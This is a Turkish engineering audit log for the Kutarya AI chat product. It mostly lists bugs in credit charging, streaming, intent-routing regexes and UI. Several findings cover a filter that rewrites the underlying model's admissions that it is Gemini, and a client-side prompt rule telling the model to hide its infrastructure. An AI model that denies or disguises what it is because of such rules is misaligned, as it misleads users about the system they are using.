# Kutarya — Denetim / Eksik Listesi

> ## 2026-09-18 YENİDEN DOĞRULAMA SINIRI
>
> Bu dosya 2026-09-02 kaynak görüntüsünün tarihî denetim kaydıdır; aktif iş
> kuyruğu değildir. O tarihten sonra `/dene`, web sunucusu ve masaüstü kaynakları
> önemli ölçüde değişti. Güncel yayın kapılarında web 398, masaüstü 221, mobil
> backend 84 birim + 2 gerçek emulator entegrasyon testi geçti. Bu listedeki
> güncel kaynakta yeniden üretilen masaüstü adayları (ikinci `main.cjs`, BYOK
> başlığı, kapanmayan uyarılar, `aria-live`, dağınık site adresleri) düzeltildi.
> Geri kalan doğrulanmamış adaylar yeni bulgu gibi taşınmayacak; yalnız yeniden
> üretilebilen işler `YAPILACAKLAR.md` içine alınacaktır. Böylece bu 106 maddelik
> tarihî liste aktif kuyruk olarak yanlış okunmaz.

> ## ✅ DURUM: 18 yüksek önemli bulgunun 17'si DÜZELTİLDİ (2026-09-02)
>
> Kullanıcı "herşeyi düzelt" dedi. Yüksek önemli bulguların tamamı elle
> doğrulandı; gerçek olanlar düzeltildi, yanlış pozitifler elendi.
> Düzeltilmeyen tek madde: **istemci taraflı kota/prompt zorlaması** —
> sunucu ucu olmadan çözülemez (bilinen blokaj).
>
> Orta/düşük önemli maddeler AŞAĞIDA duruyor ve **doğrulanmamıştır**.
> Deploy'u bloke etmezler.
>
> Ayrıntılı düzeltme günlüğü: hafıza notu `denetim-eksik-listesi`.

> ## 🔁 İKİNCİ TUR (2026-09-02, aynı gün, ikinci oturum)
>
> Orta/düşük listesinden elle doğrulanıp DÜZELTİLENLER:
>
> | Bulgu | Nerede | Ne yapıldı |
> |---|---|---|
> | Pencereye dosya bırakmak uygulamayı yok ediyor | `KutaryaDesktop/electron/main.cjs`, `src/main.jsx` | `will-navigate` kalkanı + arayüzde global dragover/drop engeli (bileşenlerin kendi bırakma alanları korundu) |
> | Bildirim gövdesindeki regex bozuk (`/s+/` → `/\s+/`) | `KutaryaDesktop/src/gorevYurutucu.js:455` | Düzeltildi; kaynakta tek örnekti |
> | Tanıtım şeridi her sohbet değişiminde çıkıyor | `KutaryaDesktop/src/ChatPanel.jsx` | Boş bağımlılık dizisi "bir kez" değil "mount başına bir kez"; `sessionStorage` ile oturumda tek sefere indirildi |
> | Tanıtım sayfasında `/dene` bağlantısı yok | `KutaryaAIWeb/src/pages/LandingPage.jsx` | "Kaydolmadan dene" bağlantısı eklendi |
> | Tanıtım sayfası hâlâ "Modu seç" diyor | `LandingPage.jsx` | Metin mod seçicisiz gerçeğe göre yeniden yazıldı |
> | `IMAGE_PROMPT_PATTERNS` "komut"u yakalıyor | `server/services/intentRouter.js:23` | `komut` çıkarıldı, mesafe `.{0,40}` ile sınırlandı; 8 vakalık test yazıldı, hepsi geçti |
> | MIT bildirimi (NOTICE.md) yayına gitmiyor | `scripts/dene-sayfasi-kopyala.mjs` | Kopyalanıyor; yoksa uyarı |
> | Kopyalama betiği kaynak yoksa sessizce atlıyor | aynı betik | Yayın derlemesinde (`--zorunlu`) HATA verir; `package.json build` güncellendi |
> | Model ucu ayarı bağlanmamış | aynı betik | `KTY_US_API_BASE` / `KTY_US_ARAC_BASE` ortamdan basılıyor |
> | SSE dalında yanıt metni marka filtresinden geçmiyor | `server/index.js`, `src/services/chatApi.js` | Akış sonunda sızıntı varsa temizlenmiş tam metin `textReplace` ile gönderilip ekrandaki değiştiriliyor |
> | Düşünme paneli akış biter bitmez kapanıyor | `KutaryaChatUI/js/deneme.js` | Yalnız cevap geldiyse kapanıyor |
> | Kotanın sıfırlanması yok, tarayıcı kalıcı kilitleniyor | aynı dosya | Hak GÜNLÜK yenileniyor; metinler güncellendi |
> | `/dene`'de siteye dönüş yolu gizli | `deneme.html` | Üst şeride her zaman görünür "Kutarya'ya git" |
> | Erişilebilirlik: girdi adı yok, akan yanıt duyurulmuyor | `deneme.html` | `aria-label` + `aria-live="polite"` |
> | Çevrimdışı metni altyapıyı ifşa ediyor | `deneme.html`, `deneme.js` | "Kutarya'nın kendi bilgisayarında çalışıyor" kaldırıldı (HTML yorumları dâhil — kaynak görüntülemede görünüyorlar) |
>
> **Yanlış pozitif çıkanlar:** "Mod seçici hâlâ 'Modu seç' diyor" → `ModePicker.jsx`
> hiçbir yerden import edilmiyor (ölü kod). "SSE boş çıktı kapısı yok" →
> önceki turda zaten düzeltilmiş. "Reasoning marka koruması yok" → düşünme
> kanalı için zaten vardı; eksik olan yalnız yanıt metniydi (yukarıda).


**Tarih:** 2026-09-02  ·  **Kapsam:** bu oturumdaki işler (deploy/yayın HARİÇ)

6 bağımsız denetim ajanı 6 alanı taradı: Kty-Us deneme ekranı, web entegrasyonu,
masaüstü, reasoning zinciri, niyet yönlendirme, tam replika.

> **UYARI — bu liste DOĞRULANMAMIŞTIR.** Doğrulama aşaması oturum limitine
> takıldı (106/106 doğrulama ajanı düştü). Aşağıdaki maddeler *aday bulgudur*;
> yanlış pozitif içerebilir. Yalnız "✅ DOĞRULANDI" işaretli olanlar elle
> kontrol edilip teyit edilmiştir.

**Dağılım:** 18 yüksek · 56 orta · 32 düşük (toplam 106)

---

## YUKSEK ÖNEM

### Marka kimliği koruması reasoning kanalına HİÇ uygulanmıyor
`D:/Kutarya/KutaryaAIWeb/server/index.js`:2544

Ürün, altyapının Gemini/Google olduğunu bilinçli gizliyor: sanitizeBrandIdentityResponse yanıt metninde "Gemini modeliyim / Google tarafından eğitildim" kalıplarını yakalayıp Kutarya cevabıyla değiştiriyor. Ama bu koruma YALNIZCA akışsız dalda (index.js:2602) çağrılıyor. SSE dalında reasoningText hiçbir filtreden geçmeden doğrudan istemciye yazılıyor ve MessageBubble ham markdown olarak render ediyor. Modelin düşünce özeti "Kullanıcı kim olduğumu soruyor; ben Google tarafından eğitilmiş bir dil modeliyim..." tarzı cümleler içermeye çok yatkındır ve panel bunu aynen gösterir. (Aynı boşluk SSE dalında yanıt metni için de var — orada da sanitizeBrandIdentityResponse/validateResponseLinks çağrılmıyor.)

> index.js:2542-2545 `if (chunk.reasoningText) { res.write(`data: ${JSON.stringify({ reasoningText: chunk.reasoningText })}\n\n`); }` — filtre yok · index.js:2602 (yalnız akışsız dal) `: sanitizeBrandIdentityResponse(result.text, { userMessage: trimmedMessage });` · brandIdentityService.js:54 `/(Gemini modeliyim|Google taraf[ıi]ndan e[ğg]itildim|...)/iu`

### SSE dalında boş çıktı kapısı yok — model sadece düşünüp cevap vermezse kredi yine düşüyor
`D:/Kutarya/KutaryaAIWeb/server/index.js`:2560

Akışsız dal `hasOutput` hesaplayıp kredi düşmeyi ona bağlıyor (2611-2622). SSE dalında böyle bir kontrol YOK: akış hatasız bittiyse `chargeCredits(effectiveUserId, finalCredits || 1, ...)` koşulsuz çalışıyor, hatta finalCredits 0 olsa bile `|| 1` ile en az 1 kredi düşüyor. Düşünme açıldığından beri "sadece thought part'ı gelen, metin gelmeyen" yanıt ihtimali arttı (fullText='' olsa da akisTamamlandi=true olur ve krediler thoughtsTokenCount üzerinden hesaplanır). Bu durumda kullanıcı ekranda "Yanıt alınamadı. Lütfen tekrar deneyin." görüyor ama kredisi düşmüş oluyor.

> index.js:2558-2562 `: await chargeCredits(effectiveUserId, finalCredits || 1, {...})` — `fullText`/`hasOutput` benzeri hiçbir koşul yok · karşılaştır index.js:2620 `const creditsUsed = (hasOutput && !isFreeResponse && !usingCustomKey) ? ... : 0;` · ChatPage.jsx:1264 `return 'Yanıt alınamadı. Lütfen tekrar deneyin.';`

### Hazır cevaplar modelin "moddan bahsetme" kuralını deliyor: kullanıcıya mod kataloğu okunuyor
`D:/Kutarya/KutaryaAIWeb/server/services/brandIdentityService.js`:78

intentRouter.js:172 sistem promptu 'Never use the word "mode"/"mod"; never tell the user to switch, select, enable, or change any mode' diyor. Ancak brandIdentityService'in detailedLevelAnswer/shortLevelAnswer fonksiyonları HAZIR CEVAP — index.js:2469-2471'de directAnswer olarak modele hiç uğramadan doğrudan kullanıcıya dönüyor, dolayısıyla sistem promptu bunları bastıramıyor. isLevelQuestion (satır 112-123) yalnız 'ne kadar güçlüsün' demesi bile yeterli olacak şekilde tetikleniyor (gucSorusu tek başına yeterli). Kullanıcı 'ne kadar güçlüsün?' yazdığında artık var olmayan bir arayüzün mod listesini okuyor: Sohbet, Derin, Araştır, Görsel, Kod, Dosya. Mod seçici kaldırıldığı için bu cevap hem kuralı deliyor hem de olmayan bir özelliği anlatıyor.

> // brandIdentityService.js:78-88 (detailedLevelAnswer)
> 'Ben Kutarya AI içinde çalışan bir yapay zeka asistanıyım. Modlar farklı kullanım seviyeleri için tasarlanmıştır.',
> '- Sohbet: Günlük konuşma, kısa cevaplar...',
> '- Görsel: Görsel üretme, görsel prompt hazırlama...',
> // satır 68 shortLevelAnswer():
> '... Sohbet modu hızlı günlük asistan seviyesinde, Derin ve Kod modları ...'
> // satır 116: const gucSorusu = /(ne kadar (güçlü|guclu|iyi|zeki...))|\bseviyen\b/ -> tek başına yeter

### Terk edilen model denemesinin response promise'i sahipsiz kalıyor — sunucu çökebilir
`D:/Kutarya/KutaryaAIWeb/server/services/geminiService.js`:557

SDK'nin generateContentStream() çağrısı stream'i tee'leyip `response` promise'ini HEMEN oluşturur. Kod bu promise'i yalnızca BAŞARILI olan son deneme için await ediyor (satır 620). Akış okunurken hata çıkan / iptal edilen her denemede promise reddediyor ve hiçbir yerde yakalanmıyor. Üç ayrı yol bunu tetikliyor: (1) satır 557/583 — kullanıcı sekmeyi kapatınca abort → `return`, (2) satır 605 — metin gitmişse `throw streamError` (akisDenemesi.response yine sahipsiz), (3) satır 550/601 — model zincirinde bir sonrakine `continue`. server/ altında `process.on('unhandledRejection')` YOK ve Node 22 varsayılanı unhandled rejection'da süreci düşürmek. SDK'nin kendi kodu (node_modules/@google/generative-ai/dist/index.js:1240) ChatSession için tam bu yüzden açık bir .catch koyuyor — bizim doğrudan kullanımımızda o koruma yok.

> geminiService.js:556-557 `for await (const chunk of akisDenemesi.stream) { if (signal?.aborted) return;` · 605 `if (fullText.length > 0) throw streamError;` · 620 `const responseResult = await resultStream.response;` (yalnız kazanan deneme) — SDK: `processStream()` → `{ stream: generateResponseSequence(stream1), response: getResponsePromise(stream2) }` ve 1240-1244 `// This must be handled to avoid unhandled rejection`

### Güvenlik/engelleme durumunda kısmi yanıt + reasoning yine de çöpe gidiyor
`D:/Kutarya/KutaryaAIWeb/server/services/geminiService.js`:589

Sağlayıcı yanıtı ortada keserse (RECITATION/SAFETY) kod bilinçli olarak kullanıcıya "_(Yanıt sağlayıcı tarafından kesildi.)_" yazıp `resultStream = akisDenemesi; akisTamamlandi = true; break outer` ile nazikçe bitiriyor. Ama hemen ardından satır 620'de `await resultStream.response` çalışıyor — o promise AYNI hatayla reddediyor (stream tee'lenmiş, kaynak hata verdi). Reddedince dış catch AI_PROVIDER_ERROR'a çeviriyor, sunucu `{error}` çerçevesi yazıyor, chatApi throw ediyor ve ChatPage tüm akış mesajını siliyor. Sonuç: kullanıcı hem yazılmış kısmi cevabı hem düşünme panelini kaybediyor ve genel bir hata görüyor — bu dalın var oluş amacı tam tersiydi.

> geminiService.js:589-594 `if (fullText.trim().length > 0) { yield { text: '\n\n_(Yanıt sağlayıcı tarafından kesildi.)_' ...}; resultStream = akisDenemesi; akisTamamlandi = true; break outer; }` → 620 `const responseResult = await resultStream.response;` · ChatPage.jsx:798 `setMessages((prev) => prev.filter((msg) => !String(msg.id || '').startsWith('streaming-message')));`

### Düşünme token'ları model çarpanıyla krediye biniyor; "bilerek düşük tutuldu" yorumu değerle çelişiyor
`D:/Kutarya/KutaryaAIWeb/server/services/geminiService.js`:467

buildThinkingGenConfig, Gemini 2.5 ailesi için varsayılan thinkingBudget=1024 gönderiyor. extractProviderUsage thoughtsTokenCount'u responseTokens'a ekliyor, calculateCreditCost ise (promptTokens+responseTokens)/100 * modelÇarpanı ile ücretlendiriyor. core kademesinde çarpan 3 → yalnız düşünme için mesaj başına ceil(1024/100*3)=31 ekstra kredi; prime'da çarpan 8. Ücretsiz plan 500 kredi ile başlıyor, yani düşünme tek başına mesaj hakkını birkaç katına kadar eritebiliyor. Üstelik satır 459-460'taki yorum "thinkingLevel/thinkingBudget bilerek düşük tutulur" diyor ama projenin KENDİ ölçeğinde (modelConfig.js dusunmeAyari) 1024 = 'high', 'low' ise 0. Plan bazlı bir kapı da yok: ücretsiz kullanıcı da aynı düşünme maliyetini ödüyor.

> geminiService.js:467 `const budget = Number(process.env.KUTARYA_THINKING_BUDGET || 1024);` · 731-732 `const thoughtsTokens = ...; const responseTokens = candidateTokens + thoughtsTokens;` · creditConfig.js:12 `providerTokensPerCredit: 100` · creditConfig.js:47 `modelCreditMultipliers: Object.freeze({ lite: 1, core: 3, prime: 8 })` · modelConfig.js:219 `const butce = { low: 0, medium: 256, high: 1024 }[seviye] ?? 0;`

### Görsel niyet kalıplarında kelime sınırı yok — sıradan sorular 250 kredilik görsel üretimine gidiyor — ✅ **DOĞRULANDI ve DÜZELTİLDİ**
`D:/Kutarya/KutaryaAIWeb/server/services/intentRouter.js`:53

IMG_SUBJECT ve IMG_VERB hiçbir yerde \b (kelime sınırı) kullanmıyor. Bu yüzden 'yap' fiili 'yapay', 'yapılır', 'yapan', 'yaparım', 'yapılandır' kelimelerinin İÇİNDE eşleşiyor; 'res[iı]?m' de 'resmi', 'resmen' içinde eşleşiyor. Kalıpları kaynaktan okuyup çalıştırdım — aşağıdaki cümlelerin HEPSİ image_generation'a (250 kredi) yönleniyor, oysa hiçbiri görsel istemiyor: 'Görsel yapay zeka nedir?', 'Resim işleme nasıl yapılır?', 'React ile logo bileşeni oluştur', 'poster tasarımı yapan siteler neler', 'resmi bir dilekçe oluştur', 'resmi yazışma örneği hazırla', 'portre fotoğrafçılığında ışık nasıl yapılır', 'çizim tahtası uygulaması yap', 'wallpaper engine nasıl yapılandırılır', 'avatar yüklemeyi nasıl yaparım', 'ikon setini css ile nasıl render ederim', 'resmen ne yapmam gerekiyor'. Ayrıca soru biçimini ('nedir', 'nasıl', 'neler', '?') bastıran hiçbir kapı yok. Bu, kullanıcının en sık sorduğu cümle tiplerinde (yapay zeka sorusu, resim/görsel işleme sorusu, logo/banner bileşeni kodu) tek mesajda 250 kredi yakıyor.

> const IMG_SUBJECT = '(?:res[iı]?m|resm|görsel|gorsel|...|wallpaper|sticker|çıkartma)';
> const IMG_VERB = '(?:çiz|ciz|resmet|oluştur|olustur|üret|uret|yap|tasarla|hazırla|hazirla|generate|render)';
> new RegExp(IMG_SUBJECT + '\\w*\\s+(?:\\S+\\s+){0,4}?' + IMG_VERB, 'i')
> // 'görsel' + ' ' + 'yap'(ay) => eşleşir. Çalıştırıldı:
> // 'Görsel yapay zeka nedir?'        -> image_generation
> // 'Resim işleme nasıl yapılır?'     -> image_generation
> // 'React ile logo bileşeni oluştur' -> image_generation

### 250 kredilik görsel üretimi öncesi hiçbir onay yok; tek uyarı etiketi mobilde ve ilk mesajda hiç görünmüyor
`D:/Kutarya/KutaryaAIWeb/src/styles/global.css`:2018

Kullanıcı 250 krediyi otomatik yönlendirmeyle harcıyor ve öncesinde onay istenmiyor. Kaldırılan video üretiminde tam bir ön kontrol + onay modalı vardı (ChatPage.jsx:552-579 videoConfirmation/approvalToken), görselde karşılığı yok. Geriye tek uyarı olarak composer'daki 'Görsel üretim: 250 kredi' etiketi kalıyor, o da iki yerde birden kayboluyor: (1) @media (max-width: 600px) bloğunda .credit-estimate display:none — yani TÜM telefonlarda görünmüyor; (2) yeni sohbetin ilk mesajında ChatPage.jsx:902 hideChrome={isWelcome} veriyor, ChatComposer.jsx:99 ise etiketi {!hideChrome && ...} ile sarmalıyor — yani masaüstünde bile ilk mesajda hiç basılmıyor. Aynı media query satır 2004'te .chat-topbar-copy small { display:none } ile üstteki 'Görsel · Kutarya Lite' rozetini de gizliyor. Sonuç: mobil kullanıcı 'Görsel yapay zeka nedir?' yazıp gönderdiğinde hiçbir uyarı görmeden 250 kredi kaybediyor.

> /* global.css, @media (max-width: 600px) içinde */
> .chat-topbar-copy small { display: none; }   /* satır 2004 */
> .credit-estimate { display: none; }          /* satır 2018 */
> 
> // ChatPage.jsx:902  hideChrome={isWelcome}
> // ChatComposer.jsx:99-103
> {!hideChrome && (
>   <span className="credit-estimate" title={usageEstimateLabel || 'Kredi başarılı çıktıdan sonra düşer'}>

### Hata bildirimi ile Kutarya Us tanıtım şeridi aynı grid hücresinde üst üste biniyor — ✅ **DOĞRULANDI ve DÜZELTİLDİ**
`D:/Kutarya/KutaryaAIWeb/src/styles/global.css`:282

İki şerit de .chat-notice sınıfını taşıyor ve .chat-notice kuralı 'grid-area: notice' veriyor. .chat-main dört satırlı adlandırılmış grid ("topbar" "notice" "messages" "input"). İki grid öğesi aynı adlandırılmış alana atanınca aynı hücreye yerleşip üst üste biniyor. ChatPage'de tanıtım şeridi sayfa her açıldığında koşulsuz gösteriliyor (mount effect'i), depolama hatırlatması da açılışta setNotice ile tetiklenebiliyor; ikisi aynı anda açıkken metinler iç içe geçip okunmaz oluyor.

> global.css:271  .chat-main { ... grid-template-areas: "topbar" "notice" "messages" "input"; ... }
> global.css:282  .chat-notice { grid-area: notice; display: flex; ... }
> ChatPage.jsx:970  {notice && (<div className="chat-notice">...
> ChatPage.jsx:982  {ktyUsPromo && (<div className="chat-notice kty-us-promo">...
> ChatPage.jsx:182-187  useEffect(() => { ... setKtyUsPromo(true); }, []);   // her açılışta

### Dosya eki tamamen bağlanmamış — + düğmesi ve <input type=file> hiçbir şey yapmıyor
`D:/Kutarya/KutaryaChatUI/index.html`:170

index.html'de `#file-input` (multiple) ve `#attach-button` (sr-only metni: "Add files, prompts, tools or MCP Servers") duruyor, boş durum metni de "Type a message or upload files to get started" diyor. Ancak app.js içinde 'attach-button', 'file-input', 'file-upload' veya dosya/FileList ile ilgili TEK bir referans bile yok (grep 0 sonuç). Düğmeye tıklamak hiçbir şey yapmıyor, dosya seçici açılmıyor, sürükle-bırak da yok. Boş durum metni var olmayan bir özelliği vaat ediyor.

> index.html:134 `<input id="file-input" type="file" multiple="" class="hidden ">` ; index.html:170-174 `<button id="attach-button" ...><span class="sr-only">Add files, prompts, tools or MCP Servers</span>` — `grep -n "attach-button|file-input|file-upload" js/app.js` => hiç eşleşme yok.

### Sohbet listesinde iç içe <button> — Rename/Delete satırın dışına düşüyor
`D:/Kutarya/KutaryaChatUI/js/app.js`:777

Satır kapsayıcısı bir <button>, içine Rename ve Delete yine <button> olarak basılıyor. HTML5 ayrıştırıcısı iç içe button'a izin vermez: dış button (ve onu saran <span class="flex shrink-0 items-center gap-0.5">) örtük olarak kapatılır. Sonuçta DOM'da eylem düğmeleri satırın YANINDA değil, satır düğmesinden SONRA kardeş olarak durur; sağa yaslı flex düzeni tamamen bozulur ve <span> boş kalır. Tıklama delegasyonu <li data-conv-id> üzerinden çalıştığı için hata sessizdir, sadece görsel olarak yanlış yerdedir.

> `<button type="button" class="${rowCls}" data-conv-action="select" ...>` ... `<span class="flex shrink-0 items-center gap-0.5">` + actionBtn('rename',...) + actionBtn('delete',...) + `</span>` + `</button></li>` — actionBtn'in kendisi de `<button type="button" data-conv-action="...">` üretiyor (app.js:768-774).

### Sohbet Rename/Delete düğmeleri kalıcı olarak GÖRÜNMEZ (bundle.css'te sınıf yok) — ✅ **DOĞRULANDI ve DÜZELTİLDİ**
`D:/Kutarya/KutaryaChatUI/js/app.js`:771

Düğmeler `opacity-0` ile başlıyor ve `group-hover/item:opacity-100` ile görünür olması bekleniyor. Ancak derlenmiş bundle.css'te `.group-hover\/item\:opacity-100` ve `.focus-visible\:opacity-100` kuralları YOK (grep sonucu 0). Karşılaştırma: `.group-hover\/collapsible\:opacity-100` bundle'da VAR (1). Tailwind yalnız orijinalin kullandığı sınıfları derlediği için bu iki varyant üretilmemiş. Sonuç: sohbetleri yeniden adlandırma ve silme eylemleri hiçbir zaman görünmez — kullanıcı için bu özellikler fiilen yok. app.css'e de eklenmemiş.

> app.js:771-772: `text-muted-foreground opacity-0 transition-opacity hover:text-accent-foreground ` + `group-hover/item:opacity-100 focus-visible:opacity-100">`  |  grep -c -F '.group-hover\/item\:opacity-100' css/bundle.css => 0

### Taban model adı sızıyor: her asistan mesajının altında "Qwen3 4B Q6_K" yazıyor
`D:/Kutarya/KutaryaChatUI/js/app.js`:523

loadProps() içinde kodun kendi yorumu "Taban model dosyasinin adi (Qwen3-4B-Q6_K) kullaniciya GOSTERILMEZ" diyor ve composer rozetini 'Kutarya Us' yapıyor. Ama sendMessage/regenerate/saveEdit asistan mesajına `model: modelInfo.source` (yani /props'tan gelen TAM dosya yolu) yazıyor, assistantInfoHtml de bunu parseModel'den geçirip rozet üretiyor. Sonuç: composer'da "Kutarya Us / 4B / Önizleme", hemen altındaki her yanıtta "Qwen3 / 4B / Q6_K". Ayrıca rozetin aria-label'ı 'Qwen3-4B-Q6_K' oluyor ve tam yol (D:/Kutarya/KutaryaModelLab/models/...) localStorage'daki sohbet kaydına yazılıyor. Hem markalama kuralının ihlali hem aynı ekranda iki çelişkili rozet.

> app.js:523 `const info = msg && msg.model ? parseModel(msg.model) : modelInfo;`  |  app.js:1083 `model: modelInfo.source || modelInfo.name,`  |  app.js:382 `const source = props.model_path || props.model_alias || props.model || '';` ; app.js:387-393 `modelInfo = { source, name: KTY_US.displayName, ... }`

### Akış iptali yok — Gönder düğmesi akış sırasında etkin ama hiçbir şey yapmıyor
`D:/Kutarya/KutaryaChatUI/js/deneme.js`:244

gonderDurumu() akış sürerken düğmeyi bilerek ETKİN bırakıyor (tam uygulamada bu satırın amacı 'durdurmak için etkin'). Ama deneme.js'te akis.abort() HİÇBİR YERDE çağrılmıyor, düğme ikonu/etiketi 'Durdur'a dönmüyor. Kullanıcı akış sırasında düğmeye basınca form submit olur, gonder() ilk satırda 'if (!soru || akis) return' ile sessizce çıkar: tıklanabilir görünen, geri bildirim vermeyen ölü düğme. Aynı şekilde textarea akış sırasında kilitlenmediği için kullanıcı yazıp Enter'a basabilir, bu da sessizce yutulur. Uzun/yavaş bir yanıtı durdurmanın hiçbir yolu yok (Escape de bağlı değil). app.js aynı işi doğru yapıyor: akışta düğme 'square' ikonuna dönüp stopStream() çağırıyor — web/deneme arasında davranış tutarsızlığı.

> deneme.js:244  dom.send.disabled = Boolean(akis) ? false : !(bosDegil && kalanHak() > 0);
> deneme.js:249  if (!soru || akis) return;
> deneme.js:266  akis = new AbortController();   // .abort() dosyada hiç geçmiyor
> karşılaştır app.js:841-843  if (mode === 'stop') { btn.setAttribute('aria-label','Stop'); ... icon('square') }
> karşılaştır app.js:1054-1057  function stopStream() { ... stream.controller.abort(); }

### Hata durumunda kota geri verilmiyor — sunucu kapalıysa 5 hakkın hepsi cevapsız yanar
`D:/Kutarya/KutaryaChatUI/js/deneme.js`:257

kullanildiArtir() istekten ÖNCE, sayaç kalıcı olarak artırılıyor. catch bloğunda geri alma (decrement) yok. Sunucu kapalı / 500 / CORS hatası / ağ kesintisi durumunda ziyaretçi 5 kere deneyip hiç cevap almadan kotasını tüketir ve 'Ücretsiz deneme mesajların bitti' ekranıyla kilitlenir. Sayaç localStorage'da olduğu için bu kilit kalıcıdır (bkz. kota sıfırlama bulgusu).

> deneme.js:255-257
>   mesajlar.push({ role: 'user', content: soru });
>   const asistanIndex = mesajlar.push({...}) - 1;
>   kullanildiArtir();          // istek ATILMADAN önce
> deneme.js:292-297  catch (err) { console.error(...); toast('Yanıt alınamadı...'); if (!mesajlar[asistanIndex].content) { mesajlar[asistanIndex].content = '_Yanıt alınamadı._'; } }   // sayaç geri alınmıyor

### Model ucu kimlik doğrulamasız; kota ve sistem promptu tamamen istemcide
`D:/Kutarya/KutaryaChatUI/js/deneme.js`:38

Ziyaretçi (a) localStorage'daki sayacı silerek sınırsız mesaj atabilir, (b) sistem promptunu tamamen değiştirebilir — kimlik koruması ('Kutarya olduğunu söyle, altyapını tartışma') ve reddetme kuralları istemcide, sunucu tarafında hiçbir zorlama yok. api.js istekte hiçbir Authorization/anahtar başlığı göndermiyor, yani uç noktası adresi öğrenilir öğrenilmez sayfadan bağımsız, serbest bir LLM API'sine dönüşür. Kodun kendi yorumu bunu zaten kabul ediyor ama karşılığı yazılmamış (yarım kalmış iş).

> deneme.js:38-41  "NOT: Kota BURADA, istemcide sayılır — yani teknik olarak aşılabilir (localStorage temizlemek yeter). Gerçek sınır, uç sunucuda IP/oturum başına uygulanmalı."
> deneme.js:269-274  const istek = [{ role: 'system', content: KTY_US_SYSTEM_PROMPT }, ...]   // system promptu istemciden gidiyor
> api.js:274-281  headers: { 'Content-Type': 'application/json', Accept: 'text/event-stream' }   // hiç kimlik başlığı yok

### /dene kotası başarısız istekte de yanıyor — 5 hatadan sonra ziyaretçi kalıcı olarak kilitleniyor
`D:/Kutarya/KutaryaChatUI/js/deneme.js`:257

gonder() içinde kullanildiArtir() istek gönderilmeden ÖNCE, try bloğunun dışında çağrılıyor. Akış hata verirse (ağ hatası, uç sunucu kapalı, HTTP != 2xx) catch dalında sayaç geri alınmıyor. Sayaç localStorage'da kalıcı olduğu için 5 başarısız denemeden sonra ziyaretçi 'Ücretsiz deneme hakkın bitti' duvarına takılıyor ve girişi/temizlemesi dışında geri dönüş yok. Anonim ziyaretçinin /chat'ten buraya zorla yönlendirildiği (App.jsx:294-297) düşünülürse tüm anonim huni bu noktada ölüyor. Düzeltme: sayacı yalnız akış en az bir içerik parçası döndürdüğünde artır ya da catch dalında geri al.

> deneme.js:255-257  mesajlar.push({ role: 'user', content: soru });
>   const asistanIndex = mesajlar.push({ role: 'assistant', ... }) - 1;
>   kullanildiArtir();
> ...
> deneme.js:292-297  } catch (err) {
>     console.error('[kty-us] akış hatası', err);
>     toast('Yanıt alınamadı. Lütfen tekrar dene.', 'error');
>     if (!mesajlar[asistanIndex].content) { mesajlar[asistanIndex].content = '_Yanıt alınamadı._'; }
>   }   // <-- sayaç geri alınmıyor

### BYOK hata yolu hata nesnesi set ediyor, React cocuk olarak render ediliyor -> beyaz ekran — ✅ **DOĞRULANDI ve DÜZELTİLDİ**
`D:/Kutarya/KutaryaDesktop/src/ChatPanel.jsx`:289

setHata cagrilarinin hepsi STRING veriyor (97, 210, 233, 330, 382) ama 289. satir NESNE veriyor. 466. satirda `{hata}` dogrudan JSX cocugu olarak basiliyor. React bir plain object'i cocuk olarak alinca 'Objects are not valid as a React child' firlatir; bu render sirasinda atilan bir hatadir ve projede hicbir ErrorBoundary yok (grep: componentDidCatch/getDerivedStateFromError -> 0 sonuc), dolayisiyla tum agac unmount olur = beyaz ekran. Tetigi zor degil: kullanici kendi API anahtariyla bir model secip saglayici 401/429/503 dondururse (veri.error) bu satir calisir. Not: styles.css:974'teki .chat__error-detay ve styles.css:845'teki `.chat__error > span` kurallari, ChatPanel'in bir zamanlar hata NESNESINI (mesaj+detay) render ettigine isaret ediyor; nesneyi set eden taraf kalmis, render eden taraf stringe donmus.

> ChatPanel.jsx:289  if (veri.error) { setHata({ mesaj: veri.error.message || 'Yanit alinamadi.' }); return; }
> ChatPanel.jsx:466  {hata && <div className="chat__error">{hata}</div>}
> Karsilastirma ChatPanel.jsx:382  setHata(error.message || 'Yanit alinamadi.');   // burada string


## ORTA ÖNEM

### Mobil istemci reasoningText çerçevesini hiç okumuyor — maliyeti ödüyor, paneli görmüyor
`D:/Kutarya/KutaryaAIMobile/app/src/main/java/com/kutarya/ai/data/repository/ChatRepository.java`:311

Mobil SSE ayrıştırıcısı yalnız `error`, `text` ve `creditsUsed` alanlarına bakıyor; `reasoningText` sessizce yok sayılıyor (çökme yok, ama düşünme arayüzü de yok). thinkingConfig sunucuda istemciden bağımsız uygulandığı için mobil kullanıcı düşünme token'larının kredi maliyetini ödüyor ama karşılığında hiçbir şey görmüyor. Aynı durum masaüstünde de var: KutaryaDesktop/src/api.js farklı bir sözleşme (`data.delta`) kullanıyor ve reasoning kavramını hiç bilmiyor. Yani aynı özellik üç yüzeyde üç farklı şekilde davranıyor.

> ChatRepository.java:304 `if (chunk.has("error"))` · 311 `if (chunk.has("text"))` · 317 `if (chunk.has("creditsUsed"))` — `reasoningText` için dal yok · KutaryaDesktop/src/api.js:391 `if (data.delta) onChunk?.({ delta: data.delta, isThinking: Boolean(data.isThinking) });`

### llama.cpp MIT bildirimi (NOTICE.md) yayınlanan /dene kopyasına taşınmıyor
`D:/Kutarya/KutaryaAIWeb/scripts/dene-sayfasi-kopyala.mjs`:29

Betik yalnız 5 JS, 2 CSS ve marka SVG'sini kopyalıyor. css/bundle.css, KutaryaChatUI/NOTICE.md'ye göre llama.cpp WebUI'nin MIT lisanslı derlenmiş stil dosyası ve olduğu gibi dağıtılıyor; MIT 'telif ve izin bildirimi tüm kopyalarda yer alacaktır' şartını koşuyor. bundle.css içinde lisans başlığı da yok (dosyada 'MIT License'/'ggml authors' geçmiyor) ve NOTICE.md public/ altında hiçbir yerde bulunmuyor. Yani https://kutarya.com/dene/css/bundle.css bildirimsiz dağıtılıyor.

> dene-sayfasi-kopyala.mjs:29-30  const JS = ['deneme.js', 'api.js', 'markdown.js', 'persona.js', 'ui.js'];
>   const CSS = ['bundle.css', 'app.css'];   // NOTICE.md listede yok
> NOTICE.md:25-26  "The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software."
> grep -c 'MIT License\|ggml authors' css/bundle.css -> 0
> ls KutaryaAIWeb/public -> brand dene desktop-latest.json ... (NOTICE yok)

### Kopyalama betiği kaynak yoksa sessizce atlıyor; sonuç anonim hunide 404 zinciri
`D:/Kutarya/KutaryaAIWeb/scripts/dene-sayfasi-kopyala.mjs`:24

